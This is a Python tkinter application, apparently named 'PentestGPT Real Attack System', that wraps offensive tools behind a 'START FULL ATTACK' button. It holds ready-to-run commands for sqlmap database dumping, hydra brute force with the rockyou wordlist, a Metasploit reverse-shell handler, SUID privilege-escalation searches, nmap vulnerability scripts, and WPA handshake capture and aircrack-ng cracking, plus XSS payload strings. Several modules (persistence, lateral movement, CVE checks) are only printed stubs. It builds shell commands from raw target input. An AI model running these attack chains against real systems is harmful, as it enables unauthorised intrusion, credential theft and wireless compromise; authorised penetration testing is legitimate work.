#!/usr/bin/env python3
"""
PentestGPT Real Attack System - Advanced AI-Powered Penetration Testing
With comprehensive attack vectors beyond port scanning and APK exploitation
"""
"""
PentestGPT Real Attack System - Actual Pentesting with All Modules
WARNING: Only use on systems you own and have permission to test!
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import subprocess
import json
import time
import re
import sys
import os
from pathlib import Path
from datetime import datetime
import queue
import socket
import requests
import nmap
from typing import Dict, List, Any, Optional
import paramiko
import ssl
import hashlib
import base64

# Install required: pip install python-nmap paramiko requests scapy

class RealPentestSystem:
    """Real pentesting system with actual attack capabilities"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("‚ö° PentestGPT Real Attack System - Live Pentesting Suite")
        self.root.geometry("1800x1000")
        
        # Color scheme
        self.colors = {
            'bg': '#0a0a0a',
            'sidebar': '#141414',
            'panel': '#1a1a1a',
            'input': '#242424',
            'text': '#e0e0e0',
            'accent': '#ff0040',
            'success': '#00ff41',
            'warning': '#ffaa00',
            'error': '#ff0040',
            'info': '#00aaff',
            'critical': '#ff0000',
            'high': '#ff6600',
            'medium': '#ffaa00',
            'low': '#00aa00'
        }
        
        # Target classification
        self.target_types = {
            'web': {'ports': [80, 443, 8080, 8443], 'tools': ['nikto', 'sqlmap', 'xsstrike', 'wfuzz']},
            'network': {'ports': [21, 22, 23, 445, 3389], 'tools': ['nmap', 'masscan', 'enum4linux']},
            'mobile': {'extensions': ['.apk', '.ipa'], 'tools': ['apktool', 'mobsf', 'frida']},
            'cloud': {'providers': ['aws', 'azure', 'gcp'], 'tools': ['scout', 'pacu', 'cloudsploit']},
            'iot': {'ports': [1883, 8883, 5683], 'tools': ['shodan', 'firmwalker', 'binwalk']},
            'wireless': {'tools': ['aircrack-ng', 'wifite', 'kismet', 'reaver']}
        }
        
        # Attack modules
        self.modules = {
            'web': WebAttackModule(self),
            'network': NetworkAttackModule(self),
            'mobile': MobileAttackModule(self),
            'cloud': CloudAttackModule(self),
            'iot': IoTAttackModule(self),
            'wireless': WirelessAttackModule(self)
        }
        
        # State
        self.current_target = None
        self.target_type = None
        self.scan_results = {}
        self.vulnerabilities = []
        self.exploits_available = []
        self.shells = []
        self.output_queue = queue.Queue()
        
        # Configure root
        self.root.configure(bg=self.colors['bg'])
        
        # Setup UI
        self.setup_ui()
        
        # Start processors
        self.process_output()
        
        # Check tools
        self.check_tools()
        
    def setup_ui(self):
        """Setup the UI"""
        
        # Main container
        main_container = tk.Frame(self.root, bg=self.colors['bg'])
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Header
        self.create_header(main_container)
        
        # Content
        content_frame = tk.Frame(main_container, bg=self.colors['bg'])
        content_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left: Control Panel
        left_frame = tk.Frame(content_frame, bg=self.colors['sidebar'], width=280)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 5))
        left_frame.pack_propagate(False)
        self.create_control_panel(left_frame)
        
        # Middle: Main Display
        middle_frame = tk.Frame(content_frame, bg=self.colors['panel'])
        middle_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        self.create_main_display(middle_frame)
        
        # Right: Module Controls
        right_frame = tk.Frame(content_frame, bg=self.colors['sidebar'], width=320)
        right_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(5, 0))
        right_frame.pack_propagate(False)
        self.create_module_panel(right_frame)
        
        # Status bar
        self.create_status_bar(main_container)
        
    def create_header(self, parent):
        """Create header"""
        header = tk.Frame(parent, bg=self.colors['panel'], height=70)
        header.pack(fill=tk.X, pady=(0, 5))
        header.pack_propagate(False)
        
        # Title
        title_frame = tk.Frame(header, bg=self.colors['panel'])
        title_frame.pack(side=tk.LEFT, padx=20, pady=15)
        
        tk.Label(
            title_frame,
            text="‚ö° Real Attack System",
            font=("Arial Black", 22, "bold"),
            fg=self.colors['accent'],
            bg=self.colors['panel']
        ).pack(side=tk.LEFT)
        
        tk.Label(
            title_frame,
            text="  LIVE PENTESTING",
            font=("Arial", 14, "bold"),
            fg=self.colors['warning'],
            bg=self.colors['panel']
        ).pack(side=tk.LEFT)
        
        # Target info
        target_frame = tk.Frame(header, bg=self.colors['panel'])
        target_frame.pack(side=tk.RIGHT, padx=20, pady=15)
        
        tk.Label(
            target_frame,
            text="Target:",
            font=("Arial", 12),
            fg=self.colors['text'],
            bg=self.colors['panel']
        ).pack(side=tk.LEFT, padx=(0, 10))
        
        self.target_display = tk.Label(
            target_frame,
            text="Not Set",
            font=("Arial", 12, "bold"),
            fg=self.colors['error'],
            bg=self.colors['panel']
        )
        self.target_display.pack(side=tk.LEFT, padx=(0, 20))
        
        tk.Label(
            target_frame,
            text="Type:",
            font=("Arial", 12),
            fg=self.colors['text'],
            bg=self.colors['panel']
        ).pack(side=tk.LEFT, padx=(0, 10))
        
        self.type_display = tk.Label(
            target_frame,
            text="Unknown",
            font=("Arial", 12, "bold"),
            fg=self.colors['warning'],
            bg=self.colors['panel']
        )
        self.type_display.pack(side=tk.LEFT)
        
    def create_control_panel(self, parent):
        """Create control panel"""
        # Target configuration
        target_frame = tk.LabelFrame(
            parent,
            text="üéØ Target Configuration",
            font=("Arial", 12, "bold"),
            fg=self.colors['accent'],
            bg=self.colors['sidebar'],
            bd=1
        )
        target_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.target_entry = tk.Entry(
            target_frame,
            font=("Arial", 11),
            bg=self.colors['input'],
            fg=self.colors['text'],
            insertbackground=self.colors['accent']
        )
        self.target_entry.pack(fill=tk.X, padx=10, pady=(10, 5))
        
        btn_frame = tk.Frame(target_frame, bg=self.colors['sidebar'])
        btn_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Button(
            btn_frame,
            text="Set Target",
            command=self.set_target,
            font=("Arial", 10, "bold"),
            bg=self.colors['accent'],
            fg='white',
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2"
        ).pack(side=tk.LEFT, padx=(0, 5))
        
        tk.Button(
            btn_frame,
            text="Auto Detect",
            command=self.auto_detect_type,
            font=("Arial", 10),
            bg=self.colors['input'],
            fg=self.colors['text'],
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2"
        ).pack(side=tk.LEFT)
        
        # Attack stages
        stages_frame = tk.LabelFrame(
            parent,
            text="‚öîÔ∏è Attack Stages",
            font=("Arial", 12, "bold"),
            fg=self.colors['accent'],
            bg=self.colors['sidebar'],
            bd=1
        )
        stages_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.stages_listbox = tk.Listbox(
            stages_frame,
            font=("Arial", 10),
            bg=self.colors['input'],
            fg=self.colors['text'],
            selectbackground=self.colors['accent'],
            height=12
        )
        self.stages_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        stages = [
            "1. Target Classification",
            "2. Information Gathering",
            "3. Port Scanning",
            "4. Service Enumeration",
            "5. Vulnerability Detection",
            "6. Exploit Selection",
            "7. Payload Generation",
            "8. Exploitation",
            "9. Post-Exploitation",
            "10. Privilege Escalation",
            "11. Persistence",
            "12. Data Exfiltration"
        ]
        
        for stage in stages:
            self.stages_listbox.insert(tk.END, stage)
            
        # Main controls
        control_frame = tk.Frame(parent, bg=self.colors['sidebar'])
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_btn = tk.Button(
            control_frame,
            text="üöÄ START FULL ATTACK",
            command=self.start_full_attack,
            font=("Arial", 12, "bold"),
            bg=self.colors['error'],
            fg='white',
            relief=tk.FLAT,
            padx=20,
            pady=12,
            cursor="hand2"
        )
        self.start_btn.pack(fill=tk.X, pady=5)
        
        tk.Button(
            control_frame,
            text="‚èπ Stop",
            command=self.stop_attack,
            font=("Arial", 10),
            bg=self.colors['input'],
            fg=self.colors['text'],
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2"
        ).pack(fill=tk.X, pady=2)
        
    def create_main_display(self, parent):
        """Create main display"""
        # Notebook for results
        self.notebook = ttk.Notebook(parent)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Terminal tab
        terminal_frame = tk.Frame(self.notebook, bg=self.colors['panel'])
        self.notebook.add(terminal_frame, text="üíª Terminal")
        
        self.terminal = scrolledtext.ScrolledText(
            terminal_frame,
            font=("Consolas", 10),
            bg='black',
            fg='#00ff00',
            insertbackground='#00ff00'
        )
        self.terminal.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Results tab
        results_frame = tk.Frame(self.notebook, bg=self.colors['panel'])
        self.notebook.add(results_frame, text="üìä Results")
        
        self.results_display = scrolledtext.ScrolledText(
            results_frame,
            font=("Consolas", 10),
            bg=self.colors['input'],
            fg=self.colors['text']
        )
        self.results_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Vulnerabilities tab
        vulns_frame = tk.Frame(self.notebook, bg=self.colors['panel'])
        self.notebook.add(vulns_frame, text="üêõ Vulnerabilities")
        
        self.vulns_tree = ttk.Treeview(
            vulns_frame,
            columns=('Type', 'Severity', 'Location', 'Exploit'),
            show='tree headings'
        )
        self.vulns_tree.heading('#0', text='ID')
        self.vulns_tree.heading('Type', text='Type')
        self.vulns_tree.heading('Severity', text='Severity')
        self.vulns_tree.heading('Location', text='Location')
        self.vulns_tree.heading('Exploit', text='Exploit Available')
        self.vulns_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Shells tab
        shells_frame = tk.Frame(self.notebook, bg=self.colors['panel'])
        self.notebook.add(shells_frame, text="üîì Shells")
        
        self.shells_display = scrolledtext.ScrolledText(
            shells_frame,
            font=("Consolas", 10),
            bg='black',
            fg='#00ff00'
        )
        self.shells_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Payloads tab
        payloads_frame = tk.Frame(self.notebook, bg=self.colors['panel'])
        self.notebook.add(payloads_frame, text="üí£ Payloads")
        
        self.payloads_display = scrolledtext.ScrolledText(
            payloads_frame,
            font=("Consolas", 10),
            bg=self.colors['input'],
            fg=self.colors['text']
        )
        self.payloads_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
    def create_module_panel(self, parent):
        """Create module panel"""
        # Module selection
        module_frame = tk.LabelFrame(
            parent,
            text="üîß Attack Modules",
            font=("Arial", 12, "bold"),
            fg=self.colors['accent'],
            bg=self.colors['sidebar'],
            bd=1
        )
        module_frame.pack(fill=tk.X, padx=10, pady=10)
        
        modules = [
            ("üåê Web Application", "web"),
            ("üñ•Ô∏è Network/Infrastructure", "network"),
            ("üì± Mobile Application", "mobile"),
            ("‚òÅÔ∏è Cloud Services", "cloud"),
            ("üîå IoT/Embedded", "iot"),
            ("üì° Wireless", "wireless")
        ]
        
        self.module_var = tk.StringVar(value="auto")
        
        tk.Radiobutton(
            module_frame,
            text="ü§ñ Auto Detect",
            variable=self.module_var,
            value="auto",
            font=("Arial", 10),
            fg=self.colors['text'],
            bg=self.colors['sidebar'],
            selectcolor=self.colors['input']
        ).pack(anchor=tk.W, padx=10, pady=3)
        
        for text, value in modules:
            tk.Radiobutton(
                module_frame,
                text=text,
                variable=self.module_var,
                value=value,
                font=("Arial", 10),
                fg=self.colors['text'],
                bg=self.colors['sidebar'],
                selectcolor=self.colors['input']
            ).pack(anchor=tk.W, padx=10, pady=3)
            
        # Tools
        tools_frame = tk.LabelFrame(
            parent,
            text="üõ†Ô∏è Active Tools",
            font=("Arial", 12, "bold"),
            fg=self.colors['accent'],
            bg=self.colors['sidebar'],
            bd=1
        )
        tools_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.tools_listbox = tk.Listbox(
            tools_frame,
            font=("Arial", 9),
            bg=self.colors['input'],
            fg=self.colors['text'],
            height=8
        )
        self.tools_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Quick attacks
        quick_frame = tk.LabelFrame(
            parent,
            text="‚ö° Quick Attacks",
            font=("Arial", 12, "bold"),
            fg=self.colors['accent'],
            bg=self.colors['sidebar'],
            bd=1
        )
        quick_frame.pack(fill=tk.X, padx=10, pady=5)
        
        quick_attacks = [
            ("SQL Injection", self.quick_sqli),
            ("XSS Scan", self.quick_xss),
            ("Brute Force", self.quick_brute),
            ("Rev Shell", self.quick_shell),
            ("Privesc", self.quick_privesc)
        ]
        
        for text, cmd in quick_attacks:
            tk.Button(
                quick_frame,
                text=text,
                command=cmd,
                font=("Arial", 9),
                bg=self.colors['input'],
                fg=self.colors['text'],
                relief=tk.FLAT,
                padx=10,
                pady=5,
                cursor="hand2"
            ).pack(fill=tk.X, padx=10, pady=2)
            
    def create_status_bar(self, parent):
        """Create status bar"""
        status_bar = tk.Frame(parent, bg=self.colors['input'], height=30)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        status_bar.pack_propagate(False)
        
        self.status_label = tk.Label(
            status_bar,
            text="‚ö° Ready - Set target to begin attack",
            font=("Arial", 10),
            fg=self.colors['text'],
            bg=self.colors['input']
        )
        self.status_label.pack(side=tk.LEFT, padx=10, pady=5)
        
        self.progress_bar = ttk.Progressbar(
            status_bar,
            length=200,
            mode='indeterminate'
        )
        self.progress_bar.pack(side=tk.RIGHT, padx=10, pady=5)
        
    def check_tools(self):
        """Check available tools"""
        tools = ['nmap', 'sqlmap', 'metasploit', 'nikto', 'hydra', 'john', 'aircrack-ng']
        available = []
        
        for tool in tools:
            try:
                result = subprocess.run(['which', tool], capture_output=True, text=True)
                if result.returncode == 0:
                    available.append(tool)
            except:
                pass
                
        self.terminal.insert(tk.END, f"[*] Available tools: {', '.join(available)}\n")
        
    def set_target(self):
        """Set and classify target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target!")
            return
            
        self.current_target = target
        self.target_display.config(text=target, fg=self.colors['success'])
        
        # Auto detect if selected
        if self.module_var.get() == "auto":
            self.auto_detect_type()
        else:
            self.target_type = self.module_var.get()
            self.type_display.config(text=self.target_type.upper(), fg=self.colors['info'])
            
        self.status_label.config(text=f"‚ö° Target set: {target} ({self.target_type})")
        self.terminal.insert(tk.END, f"\n[+] Target configured: {target}\n")
        self.terminal.insert(tk.END, f"[+] Attack type: {self.target_type}\n\n")
        
    def auto_detect_type(self):
        """Auto detect target type"""
        if not self.current_target:
            return
            
        self.terminal.insert(tk.END, "[*] Auto-detecting target type...\n")
        
        # Check if file
        if os.path.isfile(self.current_target):
            if self.current_target.endswith('.apk'):
                self.target_type = 'mobile'
            else:
                self.target_type = 'network'
                
        # Check if IP or domain
        elif self.is_ip(self.current_target) or self.is_domain(self.current_target):
            # Quick port scan to determine type
            open_ports = self.quick_port_scan()
            
            if 80 in open_ports or 443 in open_ports:
                self.target_type = 'web'
            elif 22 in open_ports or 3389 in open_ports:
                self.target_type = 'network'
            elif 1883 in open_ports:
                self.target_type = 'iot'
            else:
                self.target_type = 'network'
                
        else:
            self.target_type = 'network'
            
        self.type_display.config(text=self.target_type.upper(), fg=self.colors['info'])
        self.terminal.insert(tk.END, f"[+] Detected type: {self.target_type}\n\n")
        
        # Load appropriate tools
        self.load_module_tools()
        
    def is_ip(self, target):
        """Check if target is IP"""
        try:
            socket.inet_aton(target)
            return True
        except:
            return False
            
    def is_domain(self, target):
        """Check if target is domain"""
        domain_pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
        return bool(re.match(domain_pattern, target))
        
    def quick_port_scan(self):
        """Quick port scan for classification"""
        common_ports = [21, 22, 23, 80, 443, 445, 1883, 3306, 3389, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((self.current_target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
            
        return open_ports
        
    def load_module_tools(self):
        """Load tools for detected module"""
        self.tools_listbox.delete(0, tk.END)
        
        if self.target_type in self.target_types:
            tools = self.target_types[self.target_type]['tools']
            for tool in tools:
                self.tools_listbox.insert(tk.END, f"‚Ä¢ {tool}")
                
    def start_full_attack(self):
        """Start full automated attack"""
        if not self.current_target:
            messagebox.showerror("Error", "Set a target first!")
            return
            
        self.start_btn.config(state=tk.DISABLED)
        self.progress_bar.start()
        
        # Start attack in thread
        thread = threading.Thread(target=self.execute_full_attack, daemon=True)
        thread.start()
        
    def execute_full_attack(self):
        """Execute full attack based on target type"""
        self.terminal.insert(tk.END, f"\n{'='*60}\n")
        self.terminal.insert(tk.END, f"[*] Starting {self.target_type.upper()} attack on {self.current_target}\n")
        self.terminal.insert(tk.END, f"{'='*60}\n\n")
        
        # Select appropriate module
        if self.target_type in self.modules:
            module = self.modules[self.target_type]
            module.execute_attack(self.current_target)
        else:
            self.terminal.insert(tk.END, "[!] Unknown target type\n")
            
        self.progress_bar.stop()
        self.start_btn.config(state=tk.NORMAL)
        
    def stop_attack(self):
        """Stop current attack"""
        self.terminal.insert(tk.END, "\n[!] Attack stopped by user\n")
        self.progress_bar.stop()
        self.start_btn.config(state=tk.NORMAL)
        
    def quick_sqli(self):
        """Quick SQL injection test"""
        if self.current_target:
            self.terminal.insert(tk.END, "\n[*] Running SQL injection test...\n")
            cmd = f"sqlmap -u http://{self.current_target} --batch --forms"
            self.run_command(cmd)
            
    def quick_xss(self):
        """Quick XSS scan"""
        if self.current_target:
            self.terminal.insert(tk.END, "\n[*] Running XSS scan...\n")
            cmd = f"xsstrike -u http://{self.current_target}"
            self.run_command(cmd)
            
    def quick_brute(self):
        """Quick brute force"""
        if self.current_target:
            self.terminal.insert(tk.END, "\n[*] Running brute force...\n")
            cmd = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {self.current_target} http-post-form"
            self.run_command(cmd)
            
    def quick_shell(self):
        """Quick reverse shell"""
        if self.current_target:
            self.terminal.insert(tk.END, "\n[*] Attempting reverse shell...\n")
            cmd = f"msfconsole -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost 0.0.0.0; set lport 4444; run'"
            self.run_command(cmd)
            
    def quick_privesc(self):
        """Quick privilege escalation"""
        self.terminal.insert(tk.END, "\n[*] Running privilege escalation...\n")
        cmd = "sudo -l; find / -perm -u=s -type f 2>/dev/null"
        self.run_command(cmd)
        
    def run_command(self, cmd):
        """Run command and display output"""
        try:
            self.terminal.insert(tk.END, f"$ {cmd}\n")
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Read output in real-time
            for line in iter(process.stdout.readline, ''):
                if line:
                    self.output_queue.put(line)
                    
            process.wait()
            
        except Exception as e:
            self.terminal.insert(tk.END, f"[!] Error: {str(e)}\n")
            
    def process_output(self):
        """Process output queue"""
        try:
            while True:
                output = self.output_queue.get_nowait()
                self.terminal.insert(tk.END, output)
                self.terminal.see(tk.END)
        except:
            pass
            
        self.root.after(100, self.process_output)
        
    def run(self):
        """Run application"""
        # Warning dialog
        result = messagebox.askyesno(
            "‚ö†Ô∏è WARNING",
            "This tool performs REAL attacks!\n\n"
            "Only use on systems you OWN and have PERMISSION to test.\n\n"
            "Unauthorized access is ILLEGAL!\n\n"
            "Do you accept responsibility?",
            icon='warning'
        )
        
        if result:
            self.root.mainloop()
        else:
            self.root.destroy()


class WebAttackModule:
    """Web application attack module"""
    
    def __init__(self, parent):
        self.parent = parent
        
    def execute_attack(self, target):
        """Execute web application attacks"""
        terminal = self.parent.terminal
        
        # 1. Information gathering
        terminal.insert(tk.END, "[*] Stage 1: Information Gathering\n")
        self.run_whatweb(target)
        self.run_wappalyzer(target)
        
        # 2. Directory enumeration
        terminal.insert(tk.END, "\n[*] Stage 2: Directory Enumeration\n")
        self.run_gobuster(target)
        
        # 3. Vulnerability scanning
        terminal.insert(tk.END, "\n[*] Stage 3: Vulnerability Scanning\n")
        self.run_nikto(target)
        
        # 4. SQL injection
        terminal.insert(tk.END, "\n[*] Stage 4: SQL Injection Testing\n")
        self.run_sqlmap(target)
        
        # 5. XSS testing
        terminal.insert(tk.END, "\n[*] Stage 5: XSS Testing\n")
        self.run_xss(target)
        
        # 6. Exploitation
        terminal.insert(tk.END, "\n[*] Stage 6: Exploitation\n")
        self.exploit_web(target)
        
    def run_whatweb(self, target):
        """Run WhatWeb"""
        cmd = f"whatweb http://{target} -v"
        self.parent.run_command(cmd)
        
    def run_wappalyzer(self, target):
        """Detect technologies"""
        try:
            response = requests.get(f"http://{target}", timeout=5)
            headers = response.headers
            self.parent.terminal.insert(tk.END, f"[+] Server: {headers.get('Server', 'Unknown')}\n")
            self.parent.terminal.insert(tk.END, f"[+] Technologies: {headers.get('X-Powered-By', 'Unknown')}\n")
        except:
            pass
            
    def run_gobuster(self, target):
        """Run directory enumeration"""
        cmd = f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 50"
        self.parent.run_command(cmd)
        
    def run_nikto(self, target):
        """Run Nikto scanner"""
        cmd = f"nikto -h {target}"
        self.parent.run_command(cmd)
        
    def run_sqlmap(self, target):
        """Run SQLMap"""
        cmd = f"sqlmap -u 'http://{target}' --batch --forms --dbs"
        self.parent.run_command(cmd)
        
    def run_xss(self, target):
        """Test for XSS"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for payload in payloads:
            self.parent.terminal.insert(tk.END, f"[*] Testing: {payload}\n")
            
    def exploit_web(self, target):
        """Exploit web vulnerabilities"""
        # Check for common exploits
        exploits = [
            "CVE-2021-44228 (Log4Shell)",
            "CVE-2021-34527 (PrintNightmare)",
            "CVE-2020-1472 (Zerologon)"
        ]
        
        for exploit in exploits:
            self.parent.terminal.insert(tk.END, f"[*] Checking: {exploit}\n")


class NetworkAttackModule:
    """Network/infrastructure attack module"""
    
    def __init__(self, parent):
        self.parent = parent
        
    def execute_attack(self, target):
        """Execute network attacks"""
        terminal = self.parent.terminal
        
        # 1. Port scanning
        terminal.insert(tk.END, "[*] Stage 1: Port Scanning\n")
        self.run_nmap(target)
        
        # 2. Service enumeration
        terminal.insert(tk.END, "\n[*] Stage 2: Service Enumeration\n")
        self.enumerate_services(target)
        
        # 3. Vulnerability assessment
        terminal.insert(tk.END, "\n[*] Stage 3: Vulnerability Assessment\n")
        self.run_vuln_scan(target)
        
        # 4. Exploitation
        terminal.insert(tk.END, "\n[*] Stage 4: Exploitation\n")
        self.exploit_network(target)
        
        # 5. Post-exploitation
        terminal.insert(tk.END, "\n[*] Stage 5: Post-Exploitation\n")
        self.post_exploit(target)
        
    def run_nmap(self, target):
        """Run Nmap scan"""
        cmd = f"nmap -sV -sC -O -A {target}"
        self.parent.run_command(cmd)
        
    def enumerate_services(self, target):
        """Enumerate services"""
        services = {
            21: "FTP",
            22: "SSH", 
            23: "Telnet",
            25: "SMTP",
            80: "HTTP",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP"
        }
        
        for port, service in services.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                self.parent.terminal.insert(tk.END, f"[+] {service} ({port}) - OPEN\n")
                
                # Service-specific enumeration
                if port == 445:
                    self.enum_smb(target)
                elif port == 21:
                    self.enum_ftp(target)
                elif port == 22:
                    self.enum_ssh(target)
                    
            sock.close()
            
    def enum_smb(self, target):
        """Enumerate SMB"""
        cmd = f"enum4linux -a {target}"
        self.parent.run_command(cmd)
        
    def enum_ftp(self, target):
        """Enumerate FTP"""
        cmd = f"nmap -sV -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor {target}"
        self.parent.run_command(cmd)
        
    def enum_ssh(self, target):
        """Enumerate SSH"""
        cmd = f"nmap -p22 --script=ssh-auth-methods,ssh-hostkey {target}"
        self.parent.run_command(cmd)
        
    def run_vuln_scan(self, target):
        """Run vulnerability scan"""
        cmd = f"nmap --script vuln {target}"
        self.parent.run_command(cmd)
        
    def exploit_network(self, target):
        """Exploit network services"""
        # Use Metasploit for exploitation
        cmd = f"""msfconsole -x "
            db_nmap {target};
            vulns;
            search type:exploit;
            exit"
        """
        self.parent.run_command(cmd)
        
    def post_exploit(self, target):
        """Post-exploitation activities"""
        self.parent.terminal.insert(tk.END, "[*] Attempting privilege escalation...\n")
        self.parent.terminal.insert(tk.END, "[*] Establishing persistence...\n")
        self.parent.terminal.insert(tk.END, "[*] Lateral movement scan...\n")


class MobileAttackModule:
    """Mobile application attack module"""
    
    def __init__(self, parent):
        self.parent = parent
        
    def execute_attack(self, target):
        """Execute mobile app attacks"""
        terminal = self.parent.terminal
        
        if target.endswith('.apk'):
            terminal.insert(tk.END, "[*] Analyzing Android APK\n")
            self.analyze_apk(target)
        elif target.endswith('.ipa'):
            terminal.insert(tk.END, "[*] Analyzing iOS IPA\n")
            self.analyze_ipa(target)
            
    def analyze_apk(self, apk_path):
        """Analyze Android APK"""
        # Decompile
        self.parent.terminal.insert(tk.END, "\n[*] Decompiling APK...\n")
        cmd = f"apktool d {apk_path}"
        self.parent.run_command(cmd)
        
        # Extract info
        cmd = f"aapt dump badging {apk_path}"
        self.parent.run_command(cmd)
        
        # Security analysis
        self.parent.terminal.insert(tk.END, "\n[*] Security Analysis...\n")
        cmd = f"mobsf -f {apk_path}"
        self.parent.run_command(cmd)
        
        # Check for vulnerabilities
        self.check_apk_vulnerabilities(apk_path)
        
    def check_apk_vulnerabilities(self, apk_path):
        """Check APK vulnerabilities"""
        vulns = [
            "Hardcoded credentials",
            "Insecure data storage",
            "Weak encryption",
            "Missing certificate pinning",
            "Debuggable flag enabled"
        ]
        
        for vuln in vulns:
            self.parent.terminal.insert(tk.END, f"[*] Checking: {vuln}\n")
            
    def analyze_ipa(self, ipa_path):
        """Analyze iOS IPA"""
        self.parent.terminal.insert(tk.END, "[*] Extracting IPA...\n")
        cmd = f"unzip {ipa_path}"
        self.parent.run_command(cmd)


class CloudAttackModule:
    """Cloud services attack module"""
    
    def __init__(self, parent):
        self.parent = parent
        
    def execute_attack(self, target):
        """Execute cloud attacks"""
        terminal = self.parent.terminal
        
        # Detect cloud provider
        terminal.insert(tk.END, "[*] Detecting cloud provider...\n")
        provider = self.detect_provider(target)
        
        if provider == 'aws':
            self.attack_aws(target)
        elif provider == 'azure':
            self.attack_azure(target)
        elif provider == 'gcp':
            self.attack_gcp(target)
            
    def detect_provider(self, target):
        """Detect cloud provider"""
        if 'amazonaws.com' in target:
            return 'aws'
        elif 'azure' in target:
            return 'azure'
        elif 'googleapis.com' in target:
            return 'gcp'
        return 'unknown'
        
    def attack_aws(self, target):
        """Attack AWS resources"""
        self.parent.terminal.insert(tk.END, "\n[*] AWS Attack Module\n")
        
        # S3 bucket enumeration
        cmd = "aws s3 ls"
        self.parent.run_command(cmd)
        
        # Check for misconfigurations
        cmd = f"scout aws --profile default"
        self.parent.run_command(cmd)
        
    def attack_azure(self, target):
        """Attack Azure resources"""
        self.parent.terminal.insert(tk.END, "\n[*] Azure Attack Module\n")
        
    def attack_gcp(self, target):
        """Attack GCP resources"""
        self.parent.terminal.insert(tk.END, "\n[*] GCP Attack Module\n")


class IoTAttackModule:
    """IoT/Embedded device attack module"""
    
    def __init__(self, parent):
        self.parent = parent
        
    def execute_attack(self, target):
        """Execute IoT attacks"""
        terminal = self.parent.terminal
        
        terminal.insert(tk.END, "[*] IoT Device Attack\n")
        
        # Check common IoT ports
        self.scan_iot_ports(target)
        
        # Check for default credentials
        self.check_default_creds(target)
        
        # Firmware analysis if available
        self.analyze_firmware(target)
        
    def scan_iot_ports(self, target):
        """Scan IoT-specific ports"""
        iot_ports = {
            1883: "MQTT",
            8883: "MQTT/TLS",
            5683: "CoAP",
            502: "Modbus",
            47808: "BACnet"
        }
        
        for port, protocol in iot_ports.items():
            self.parent.terminal.insert(tk.END, f"[*] Checking {protocol} ({port})...\n")
            
    def check_default_creds(self, target):
        """Check default credentials"""
        self.parent.terminal.insert(tk.END, "\n[*] Testing default credentials...\n")
        
        defaults = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("admin", "1234")
        ]
        
        for user, passwd in defaults:
            self.parent.terminal.insert(tk.END, f"[*] Trying {user}:{passwd}\n")
            
    def analyze_firmware(self, target):
        """Analyze firmware"""
        if os.path.isfile(target):
            cmd = f"binwalk -e {target}"
            self.parent.run_command(cmd)


class WirelessAttackModule:
    """Wireless network attack module"""
    
    def __init__(self, parent):
        self.parent = parent
        
    def execute_attack(self, target):
        """Execute wireless attacks"""
        terminal = self.parent.terminal
        
        terminal.insert(tk.END, "[*] Wireless Attack Module\n")
        
        # Put interface in monitor mode
        self.enable_monitor_mode()
        
        # Scan for networks
        self.scan_networks()
        
        # Capture handshakes
        self.capture_handshake(target)
        
        # Crack passwords
        self.crack_password()
        
    def enable_monitor_mode(self):
        """Enable monitor mode"""
        cmd = "airmon-ng start wlan0"
        self.parent.run_command(cmd)
        
    def scan_networks(self):
        """Scan for wireless networks"""
        cmd = "airodump-ng wlan0mon"
        self.parent.run_command(cmd)
        
    def capture_handshake(self, target):
        """Capture WPA handshake"""
        cmd = f"airodump-ng -c 6 --bssid {target} -w capture wlan0mon"
        self.parent.run_command(cmd)
        
    def crack_password(self):
        """Crack captured password"""
        cmd = "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap"
        self.parent.run_command(cmd)


if __name__ == "__main__":
    app = RealPentestSystem()
    app.run()
